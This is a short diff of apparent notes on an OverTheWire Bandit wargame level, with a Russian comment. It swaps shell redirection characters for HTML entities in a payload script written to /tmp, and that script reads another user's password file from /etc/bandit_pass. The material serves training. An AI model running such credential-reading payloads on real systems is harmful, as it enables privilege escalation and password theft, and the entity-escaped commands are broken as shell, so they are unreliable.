@@ -65,9 +65,9 @@ echo \"\$OUT\"
 
 /tmp/p24.10015
 
-bandit23@bandit:\~\$ cat \> /tmp/p.sh \<\<\'EOF\'
+bandit23@bandit:\~\$ cat \&gt; /tmp/p.sh \&lt;\&lt;\'EOF\'
 
-\> cat /etc/bandit_pass/bandit24 \> \_\_OUT\_\_
+\&gt; cat /etc/bandit_pass/bandit24 \&gt; \_\_OUT\_\_
 
 chmod 644 \_\_OUT\_\_
 
@@ -99,11 +99,11 @@ echo \"\$OUT\"
 
 \# 2) собираем payload заранее со shebang
 
-cat \> /tmp/p.sh \<\<\'EOF\'
+cat \&gt; /tmp/p.sh \&lt;\&lt;\'EOF\'
 
 #!/bin/bash
 
-cat /etc/bandit_pass/bandit24 \> \_\_OUT\_\_
+cat /etc/bandit_pass/bandit24 \&gt; \_\_OUT\_\_
 
 chmod 644 \_\_OUT\_\_
 
